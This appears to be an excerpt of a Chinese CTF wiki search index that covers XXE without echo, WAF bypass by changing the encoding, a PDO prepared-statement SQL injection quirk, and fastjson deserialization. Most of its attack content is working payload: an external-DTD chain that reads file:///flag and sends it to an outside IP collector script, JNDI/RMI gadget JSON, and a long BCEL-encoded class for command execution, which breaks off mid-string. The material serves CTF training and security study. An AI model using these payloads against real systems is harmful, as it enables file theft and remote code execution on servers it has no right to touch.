\u9996\u5148\u5efa\u4e00\u4e2aindex.php <?php $cookie = $_GET [ 'q' ]; $myFile = \"cookie.txt\" ; file_put_contents ( $myFile , $cookie , FILE_APPEND ); ?> evil.dtd <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\" > <!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://42.192.137.212/index.php?q=%file;'>\" > python\u53d1\u9001\u8bf7\u6c42\u5373\u53ef\uff0c\u4e4b\u540e\u518d\u7f51\u7ad9\u6839\u76ee\u5f55cookie.txt\u67e5\u770b\u83b7\u53d6\u7684flag\u5373\u53ef import requests url = 'http://8bb031b1-bab9-43fe-b73b-d9741ed6617b.chall.ctf.show/' payload = \"\"\"<!DOCTYPE convert [ <!ENTITY % remote SYSTEM \"http://42.192.137.212/evil.dtd\"> %remote;%int;%send; ]> \"\"\" requests.post(url, data=payload)","title":"XXE\u89e3\u51b3\u65e0\u56de\u663e"},{"location":"CTFWiki/Web/XXE/\u65e0\u56de\u663e/#_1","text":"\u5173\u4e8e\u5b9e\u4f53\u5d4c\u5957\u7684\u60c5\u51b5\uff0c\u6bd4\u8f83\u5e78\u8fd0\u7684\u662fDTD\u4e2d\u652f\u6301\u5355\u53cc\u5f15\u53f7\uff0c\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u5355\u53cc\u5f15\u53f7\u95f4\u9694\u4f7f\u7528\u4f5c\u4e3a\u533a\u5206\u5d4c\u5957\u5b9e\u4f53\u548c\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\uff1b\u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u9700\u8981\u518d\u5d4c\u5957\u4e00\u4e2a\u53c2\u6570\u5b9e\u4f53\uff0c%\u53f7\u662f\u9700\u8981\u5904\u7406\u6210 % \u5982\u4e0b\uff1a <!ENTITY % param1 '<!ENTITY % xxe SYSTEM \"http://evil/log?%payload;\" >' &#37; \u4e5f\u53ef\u5199\u4e3a16\u8fdb\u5236 &#x25;","title":"\u5907\u6ce8"},{"location":"CTFWiki/Web/XXE/\u7f16\u7801\u7ed5\u8fc7/","text":"XXE\u4ecb\u7ecd\u4e0e\u7ed5\u8fc7 \u00b6 \u4e00\u4e2axml\u6587\u6863\u4e0d\u4ec5\u53ef\u4ee5\u7528UTF-8\u7f16\u7801\uff0c\u4e5f\u53ef\u4ee5\u7528UTF-16(\u4e24\u4e2a\u53d8\u4f53\u200a-\u200aBE\u548cLE)\u3001UTF-32(\u56db\u4e2a\u53d8\u4f53\u200a-\u200aBE\u3001LE\u30012143\u30013412)\u548cEBCDIC\u7f16\u7801\u3002 \u5728\u8fd9\u79cd\u7f16\u7801\u7684\u5e2e\u52a9\u4e0b\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u7ed5\u8fc7WAF\uff0c\u56e0\u4e3a\u5728\u8fd9\u79cd\u7c7b\u578b\u7684WAF\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u901a\u5e38\u4ec5\u914d\u7f6e\u4e3a\u5355\u5b57\u7b26\u96c6\u3002 \u5916\u6765\u7f16\u7801\u4e5f\u53ef\u7528\u4e8e\u7ed5\u8fc7\u6210\u719f\u7684WAF\uff0c\u56e0\u4e3a\u5b83\u4eec\u5e76\u4e0d\u603b\u662f\u80fd\u591f\u5904\u7406\u4e0a\u9762\u5217\u51fa\u7684\u6240\u6709\u7f16\u7801\u3002\u4f8b\u5982\uff0clibxml2\u89e3\u6790\u5668\u53ea\u652f\u6301\u4e00\u79cd\u7c7b\u578b\u7684utf-32\u200a-\u200autf-32BE\uff0c\u7279\u522b\u662f\u4e0d\u652f\u6301BOM\u3002 Exploit \u00b6 \u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50 <?php error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/<\\?xml version=\"1\\.0\"|http/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); \u5728\u8fd9\u91cc\u4ed6\u628a\u6211\u4eec\u80fd\u7528\u7684\u8fc7\u6ee4\u4e86\u6807\u5934 <?xml?> \u6bd5\u7adf\u662f\u53ef\u9009\u9879\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e0d\u7528\u7ba1\uff0c\u81f3\u4e8e\u8fc7\u6ee4\u4e86\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u5176\u4ed6\u7f16\u7801\u8fdb\u884c\u7ed5\u8fc7 \u4e0b\u9762\u662f\u9700\u8981\u8fd0\u884c\u7684python\u7684\u5185\u5bb9 import requests url = 'http://url/' payload = \"\"\"<!DOCTYPE convert [ <!ENTITY % r emote SYSTEM \"http://yourVPS/evil.dtd\"> %r emote; %i nt; %s end; ]> \"\"\" payload = payload . encode ( 'utf-16' ) requests . post ( url , data = payload ) index.php <?php $cookie = $_GET [ 'q' ]; $myFile = \"cookie.txt\" ; file_put_contents ( $myFile , $cookie , FILE_APPEND ); ?> evil.dtd <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\" > <!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://42.192.137.212/index.php?q=%file;'>\" >","title":"XXE\u4ecb\u7ecd\u4e0e\u7ed5\u8fc7"},{"location":"CTFWiki/Web/XXE/\u7f16\u7801\u7ed5\u8fc7/#xxe","text":"\u4e00\u4e2axml\u6587\u6863\u4e0d\u4ec5\u53ef\u4ee5\u7528UTF-8\u7f16\u7801\uff0c\u4e5f\u53ef\u4ee5\u7528UTF-16(\u4e24\u4e2a\u53d8\u4f53\u200a-\u200aBE\u548cLE)\u3001UTF-32(\u56db\u4e2a\u53d8\u4f53\u200a-\u200aBE\u3001LE\u30012143\u30013412)\u548cEBCDIC\u7f16\u7801\u3002 \u5728\u8fd9\u79cd\u7f16\u7801\u7684\u5e2e\u52a9\u4e0b\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u7ed5\u8fc7WAF\uff0c\u56e0\u4e3a\u5728\u8fd9\u79cd\u7c7b\u578b\u7684WAF\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u901a\u5e38\u4ec5\u914d\u7f6e\u4e3a\u5355\u5b57\u7b26\u96c6\u3002 \u5916\u6765\u7f16\u7801\u4e5f\u53ef\u7528\u4e8e\u7ed5\u8fc7\u6210\u719f\u7684WAF\uff0c\u56e0\u4e3a\u5b83\u4eec\u5e76\u4e0d\u603b\u662f\u80fd\u591f\u5904\u7406\u4e0a\u9762\u5217\u51fa\u7684\u6240\u6709\u7f16\u7801\u3002\u4f8b\u5982\uff0clibxml2\u89e3\u6790\u5668\u53ea\u652f\u6301\u4e00\u79cd\u7c7b\u578b\u7684utf-32\u200a-\u200autf-32BE\uff0c\u7279\u522b\u662f\u4e0d\u652f\u6301BOM\u3002","title":"XXE\u4ecb\u7ecd\u4e0e\u7ed5\u8fc7"},{"location":"CTFWiki/Web/XXE/\u7f16\u7801\u7ed5\u8fc7/#exploit","text":"\u6211\u4eec\u6765\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50 <?php error_reporting(0); libxml_disable_entity_loader(false); $xmlfile = file_get_contents('php://input'); if(preg_match('/<\\?xml version=\"1\\.0\"|http/i', $xmlfile)){ die('error'); } if(isset($xmlfile)){ $dom = new DOMDocument(); $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); } highlight_file(__FILE__); \u5728\u8fd9\u91cc\u4ed6\u628a\u6211\u4eec\u80fd\u7528\u7684\u8fc7\u6ee4\u4e86\u6807\u5934 <?xml?> \u6bd5\u7adf\u662f\u53ef\u9009\u9879\uff0c\u6240\u4ee5\u53ef\u4ee5\u4e0d\u7528\u7ba1\uff0c\u81f3\u4e8e\u8fc7\u6ee4\u4e86\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u5176\u4ed6\u7f16\u7801\u8fdb\u884c\u7ed5\u8fc7 \u4e0b\u9762\u662f\u9700\u8981\u8fd0\u884c\u7684python\u7684\u5185\u5bb9 import requests url = 'http://url/' payload = \"\"\"<!DOCTYPE convert [ <!ENTITY % r emote SYSTEM \"http://yourVPS/evil.dtd\"> %r emote; %i nt; %s end; ]> \"\"\" payload = payload . encode ( 'utf-16' ) requests . post ( url , data = payload ) index.php <?php $cookie = $_GET [ 'q' ]; $myFile = \"cookie.txt\" ; file_put_contents ( $myFile , $cookie , FILE_APPEND ); ?> evil.dtd <!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///flag\" > <!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://42.192.137.212/index.php?q=%file;'>\" >","title":"Exploit"},{"location":"CTFWiki/Web/\u5b89\u5168\u7814\u7a76/PDO\u7684ATTR_EMULATE_PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898/","text":"@Author\uff1aY4tacker @time\uff1a2021/01/27 11:10 AM. PDO\u7684ATTR_EMULATE_PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898 \u00b6 \u8fd9\u6b21\u7684\u601d\u8003\u6765\u6e90\u4e8e\u6211\u6628\u5929\u5bf9TP5.0.9\u8fdb\u884cSQL\u6f0f\u6d1e\u590d\u73b0\u7684\u65f6\u5019\u6240\u5f15\u53d1\u7684\u601d\u8003 \u5f53\u65f6\u5728PDO\u7684prepare\u7f16\u8bd1\u9636\u6bb5\u62a5\u9519\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u4e4b\u540e\uff0c\u5728\u9875\u9762\u5c45\u7136\u53d1\u73b0sql\u88ab\u6267\u884c\u4e86\uff01\uff01\uff01 \u56e0\u4e3a\u6211\u4eec\u77e5\u9053PDO\u5206\u4e3a\u4e09\u4e2a\u9636\u6bb5\uff0cprepare\uff0cbindParam\u548cexecute\uff0c\u5982\u4e0b\u6240\u793a <?php $dsn = 'mysql:dbname=test;host=localhost;charset=utf8'; $user = 'root'; $password = '123456'; try { $pdo = new PDO($dsn, $user, $password); } catch (PDOException $e) { echo 'Connection failed: ' . $e->getMessage(); } $pdo->query('set names utf8'); $sql = \"select * from user where uid>? and age>?\"; $stat = $pdo->prepare($sql); $stat->bindParam(4,$id); $stat->bindParam(10,$name); $stat->execute(); $arrResult = $stat->fetchAll();php \u6211\u4eec\u4e5f\u77e5\u9053\uff0c\u4f1a\u5728execute\u6267\u884c\u540e\u624d\u4f1a\u6267\u884c\u7ed3\u679c\uff0c\u53ef\u662f\u6211\u4eec\u5982\u679c\u8bbe\u7f6e\u4e86 PDO::ATTR_EMULATE_PREPARES => false, \u6211\u4eec\u770b\u770b\u5b98\u7f51\u7ed9\u7684\u63cf\u8ff0 PDO::ATTR_EMULATE_PREPARES \u542f\u7528\u6216\u7981\u7528\u9884\u5904\u7406\u8bed\u53e5\u7684\u6a21\u62df\u3002 \u6709\u4e9b\u9a71\u52a8\u4e0d\u652f\u6301\u6216\u6709\u9650\u5ea6\u5730\u652f\u6301\u672c\u5730\u9884\u5904\u7406\u3002\u4f7f\u7528\u6b64\u8bbe\u7f6e\u5f3a\u5236PDO\u603b\u662f\u6a21\u62df\u9884\u5904\u7406\u8bed\u53e5\uff08\u5982\u679c\u4e3a true \uff09\uff0c\u6216\u8bd5\u7740\u4f7f\u7528\u672c\u5730\u9884\u5904\u7406\u8bed\u53e5\uff08\u5982\u679c\u4e3a false \uff09\u3002\u5982\u679c\u9a71\u52a8\u4e0d\u80fd\u6210\u529f\u9884\u5904\u7406\u5f53\u524d\u67e5\u8be2\uff0c\u5b83\u5c06\u603b\u662f\u56de\u5230\u6a21\u62df\u9884\u5904\u7406\u8bed\u53e5\u4e0a\u3002 \u9700\u8981 bool \u7c7b\u578b\u3002 \u4ed6\u4f1a\u5728\u629b\u51fa\u5f02\u5e38\u7684\u65f6\u5019\u540c\u65f6\u4e5f\u6267\u884c\u4e86sql\u8bed\u53e5\uff0c\u5f53\u7136\u4e3a\u4e86\u80fd\u629b\u51fa\u5f02\u5e38\u6211\u4eec\u540c\u65f6\u4e5f\u4f1a\u8bbe\u7f6e PDO::ERRMODE_EXCEPTION\u6765\u629b\u51fa\u5f02\u5e38 \u4e0b\u9762\u8fdb\u884c\u5b9e\u9a8c\u73af\u8282\uff0c\u6211\u4eec\u5229\u7528\u62a5\u9519\u6ce8\u5165\u629b\u51fa\u5f02\u5e38\uff0c\u540c\u65f6\u6211\u4eec\u6253\u5f00WireShark\u8fdb\u884c\u7b80\u5355\u5206\u6790 <?php use think\\exception\\PDOException ; $dsn = 'mysql:dbname=tptptp;host=localhost;port=3306;charset=utf8' ; $user = 'tptptp' ; $password = 'tptptp' ; $params = [ PDO :: ATTR_ERRMODE => PDO :: ERRMODE_EXCEPTION , PDO :: ATTR_EMULATE_PREPARES => false , ]; try { $pdo = new PDO ( $dsn , $user , $password , $params ); } catch ( PDOException $e ) { echo 'Connection failed: ' . $e -> getMessage (); } $sql = \"SELECT * FROM `users` WHERE `Id` IN (1,updatexml(0,concat(0xa,@@version),0)) \" ; try { $stat = $pdo -> prepare ( $sql ); } catch ( \\PDOException $e ) { throw new PDOException ( $e , $this -> config , $this -> getLastsql ()); } \u8fd9\u91cc\u6211\u4eec\u8fdb\u5165\u4e86\u53d1\u8d77\u4e86prepare\u7684\u8bf7\u6c42\u5305 \u5728response\u4e2d\u5c45\u7136\u5e26\u4e86\u6211\u4eec\u7684 \u56e0\u6b64\u4e5f\u4e0d\u96be\u89e3\u91ca\u4e3a\u4ec0\u4e48TP\u629b\u51fa\u5f02\u5e38\u7684\u65f6\u5019\u663e\u793a\u6267\u884c\u4e86sql\u8bed\u53e5\u4e86\uff0c\u5206\u6790\u5b8c\u6bd5 \u53c2\u8003\u94fe\u63a5 \u00b6 https://www.php.net/manual/zh/pdo.setattribute.php","title":"PDO\u7684ATTR EMULATE PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898"},{"location":"CTFWiki/Web/\u5b89\u5168\u7814\u7a76/PDO\u7684ATTR_EMULATE_PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898/#pdoattr_emulate_prepares","text":"\u8fd9\u6b21\u7684\u601d\u8003\u6765\u6e90\u4e8e\u6211\u6628\u5929\u5bf9TP5.0.9\u8fdb\u884cSQL\u6f0f\u6d1e\u590d\u73b0\u7684\u65f6\u5019\u6240\u5f15\u53d1\u7684\u601d\u8003 \u5f53\u65f6\u5728PDO\u7684prepare\u7f16\u8bd1\u9636\u6bb5\u62a5\u9519\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u4e4b\u540e\uff0c\u5728\u9875\u9762\u5c45\u7136\u53d1\u73b0sql\u88ab\u6267\u884c\u4e86\uff01\uff01\uff01 \u56e0\u4e3a\u6211\u4eec\u77e5\u9053PDO\u5206\u4e3a\u4e09\u4e2a\u9636\u6bb5\uff0cprepare\uff0cbindParam\u548cexecute\uff0c\u5982\u4e0b\u6240\u793a <?php $dsn = 'mysql:dbname=test;host=localhost;charset=utf8'; $user = 'root'; $password = '123456'; try { $pdo = new PDO($dsn, $user, $password); } catch (PDOException $e) { echo 'Connection failed: ' . $e->getMessage(); } $pdo->query('set names utf8'); $sql = \"select * from user where uid>? and age>?\"; $stat = $pdo->prepare($sql); $stat->bindParam(4,$id); $stat->bindParam(10,$name); $stat->execute(); $arrResult = $stat->fetchAll();php \u6211\u4eec\u4e5f\u77e5\u9053\uff0c\u4f1a\u5728execute\u6267\u884c\u540e\u624d\u4f1a\u6267\u884c\u7ed3\u679c\uff0c\u53ef\u662f\u6211\u4eec\u5982\u679c\u8bbe\u7f6e\u4e86 PDO::ATTR_EMULATE_PREPARES => false, \u6211\u4eec\u770b\u770b\u5b98\u7f51\u7ed9\u7684\u63cf\u8ff0 PDO::ATTR_EMULATE_PREPARES \u542f\u7528\u6216\u7981\u7528\u9884\u5904\u7406\u8bed\u53e5\u7684\u6a21\u62df\u3002 \u6709\u4e9b\u9a71\u52a8\u4e0d\u652f\u6301\u6216\u6709\u9650\u5ea6\u5730\u652f\u6301\u672c\u5730\u9884\u5904\u7406\u3002\u4f7f\u7528\u6b64\u8bbe\u7f6e\u5f3a\u5236PDO\u603b\u662f\u6a21\u62df\u9884\u5904\u7406\u8bed\u53e5\uff08\u5982\u679c\u4e3a true \uff09\uff0c\u6216\u8bd5\u7740\u4f7f\u7528\u672c\u5730\u9884\u5904\u7406\u8bed\u53e5\uff08\u5982\u679c\u4e3a false \uff09\u3002\u5982\u679c\u9a71\u52a8\u4e0d\u80fd\u6210\u529f\u9884\u5904\u7406\u5f53\u524d\u67e5\u8be2\uff0c\u5b83\u5c06\u603b\u662f\u56de\u5230\u6a21\u62df\u9884\u5904\u7406\u8bed\u53e5\u4e0a\u3002 \u9700\u8981 bool \u7c7b\u578b\u3002 \u4ed6\u4f1a\u5728\u629b\u51fa\u5f02\u5e38\u7684\u65f6\u5019\u540c\u65f6\u4e5f\u6267\u884c\u4e86sql\u8bed\u53e5\uff0c\u5f53\u7136\u4e3a\u4e86\u80fd\u629b\u51fa\u5f02\u5e38\u6211\u4eec\u540c\u65f6\u4e5f\u4f1a\u8bbe\u7f6e PDO::ERRMODE_EXCEPTION\u6765\u629b\u51fa\u5f02\u5e38 \u4e0b\u9762\u8fdb\u884c\u5b9e\u9a8c\u73af\u8282\uff0c\u6211\u4eec\u5229\u7528\u62a5\u9519\u6ce8\u5165\u629b\u51fa\u5f02\u5e38\uff0c\u540c\u65f6\u6211\u4eec\u6253\u5f00WireShark\u8fdb\u884c\u7b80\u5355\u5206\u6790 <?php use think\\exception\\PDOException ; $dsn = 'mysql:dbname=tptptp;host=localhost;port=3306;charset=utf8' ; $user = 'tptptp' ; $password = 'tptptp' ; $params = [ PDO :: ATTR_ERRMODE => PDO :: ERRMODE_EXCEPTION , PDO :: ATTR_EMULATE_PREPARES => false , ]; try { $pdo = new PDO ( $dsn , $user , $password , $params ); } catch ( PDOException $e ) { echo 'Connection failed: ' . $e -> getMessage (); } $sql = \"SELECT * FROM `users` WHERE `Id` IN (1,updatexml(0,concat(0xa,@@version),0)) \" ; try { $stat = $pdo -> prepare ( $sql ); } catch ( \\PDOException $e ) { throw new PDOException ( $e , $this -> config , $this -> getLastsql ()); } \u8fd9\u91cc\u6211\u4eec\u8fdb\u5165\u4e86\u53d1\u8d77\u4e86prepare\u7684\u8bf7\u6c42\u5305 \u5728response\u4e2d\u5c45\u7136\u5e26\u4e86\u6211\u4eec\u7684 \u56e0\u6b64\u4e5f\u4e0d\u96be\u89e3\u91ca\u4e3a\u4ec0\u4e48TP\u629b\u51fa\u5f02\u5e38\u7684\u65f6\u5019\u663e\u793a\u6267\u884c\u4e86sql\u8bed\u53e5\u4e86\uff0c\u5206\u6790\u5b8c\u6bd5","title":"PDO\u7684ATTR_EMULATE_PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898"},{"location":"CTFWiki/Web/\u5b89\u5168\u7814\u7a76/PDO\u7684ATTR_EMULATE_PREPARES\u5c5e\u6027\u5e26\u6765\u7684\u5b89\u5168\u95ee\u9898/#_1","text":"https://www.php.net/manual/zh/pdo.setattribute.php","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"CTFWiki/Web/\u7f16\u7a0b\u8bed\u8a00/Java/fastjson/fastjson/","text":"Fastjson \u00b6 Fastjson\u59ff\u52bf\u6280\u5de7\u96c6\u5408 \u63a2\u6d4b \u00b6 \u7528\u6765\u63a2\u6d4b\u76ee\u6807\u7248\u672c\uff0c\u624d\u80fd\u66f4\u597d\u786e\u5b9a\u4f7f\u7528\u7684payload\u3002\u8fd8\u53ef\u4ee5\u7528\u6765\u533a\u5206fastjson\u548cJackjson\u3002 fastjson\u63a2\u6d4b\u7248\u672c\uff0c\u8fd8\u53ef\u4ee5\u7528\u9519\u8bef\u683c\u5f0f\u7684json\u53d1\u8fc7\u53bb\u3002\u5982\u679c\u5bf9\u65b9\u5f02\u5e38\u672a\u5904\u7406\u53ef\u62a5\u51fa\u8be6\u7ec6\u7248\u672c\u3002 \u4e3b\u8981\u662f\u5229\u7528\u5404\u4e2a\u7c7b\u88ab\u52a0\u5165\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u8fdb\u884c\u5224\u65ad fastjson >1.2.43 { \"@type\" : \"java.net.URL\" , \"val\" : \"dnslog\" } fastjson >1.2.48 { \"@type\" : \"java.net.InetAddress\" , \"val\" : \"dnslog\" } fastjson >1.2.68 { \"@type\" : \"java.net.Inet4Address\" , \"val\" : \"dnslog\" } { \"@type\" : \"java.net.Inet6Address\" , \"val\" : \"dnslog\" } {{ \"@type\" : \"java.net.URL\" , \"val\" : \"dnslog\" }: \"aaa\" } { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }} \"\" } Set [ { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" } ] Set [ { \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" } { \"@type\" : \"java.net.InetSocketAddress\" { \"address\" :, \"val\" : \"dnslog\" }} {{ \"@type\" : \"java.net.URL\" , \"val\" : \"http://dnslog\" }: 0 \u5404\u7248\u672c\u5229\u7528 \u00b6 \u9664\u4e86\u8003\u8651Fastjson\u7248\u672c\uff0c\u8fd8\u5f97\u8003\u8651JDK\u7248\u672c\uff0c\u4e2d\u95f4\u4ef6\u7248\u672c\uff0c\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7248\u672c\u3002 JDK\u7248\u672c\u5bf9\u4e8eJDNI\u6ce8\u5165\u7684\u9650\u5236\uff0c\u57fa\u4e8eRMI\u5229\u7528\u7684JDK\u7248\u672c<=6u141\u30017u131\u30018u121\uff0c\u57fa\u4e8eLDAP\u5229\u7528\u7684JDK\u7248\u672c<=6u211\u30017u201\u30018u191\u3002\uff08\u66f4\u9ad8\u7248\u672c\u4e5f\u6709\u7ed5\u8fc7\uff09 \u66f4\u9ad8\u7248\u672c\u7ed5\u8fc7\u53ef\u7528https://github.com/veracode-research/rogue-jndi jndi JdbcRowSetImpl C3p0#JndiRefForwardingDataSource JndiDataSourceFactory bcel tomcat#dbcp ibatis TemplatesImpl Fastjson 1.2.22-1.2.24 \u00b6 JdbcRowSetImpl \u00b6 { \"@type\" : \"com.sun.rowset.JdbcRowSetImpl\" , \"dataSourceName\" : \"rmi://127.0.0.1:1099/badClassName\" , \"autoCommit\" : true } c3p0#JndiRefForwardingDataSource \u00b6 JdbcRowSetImpl\u65e0\u6cd5\u6210\u529f\u53ef\u4ee5\u4e00\u8bd5 { \"@type\" : \"com.mchange.v2.c3p0.JndiRefForwardingDataSource\" , \"jndiName\" : \"rmi://127.0.0.1:1099/badClassName\" , \"loginTimeout\" : 0 } bcel \u00b6 \u53ef\u7528\u4e8e\u89e3\u51b3\u4e0d\u51fa\u7f51\u5229\u7528\u3002 \u9700\u8981\u6ce8\u610f\u5728Java 8u251\u4ee5\u540e\uff0cbcel\u7c7b\u88ab\u5220\u9664\u3002 tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource tomcat8\u53ca\u5176\u4ee5\u540e org.apache.tomcat.dbcp.dbcp2.BasicDataSource Poc { { \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$...\" } }: \"x\" } exp \u6267\u884c\u547d\u4ee4\u56de\u663e. POST / json HTTP / 1.1 Host: 127.0.0.1 : 9092 Content - Type : application / json cmd: whoami Content - Length : 3327 { { \"@type\" : \"com.alibaba.fastjson.JSONObject\" , \"x\" :{ \"@type\" : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\" , \"driverClassLoader\" : { \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\" : \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c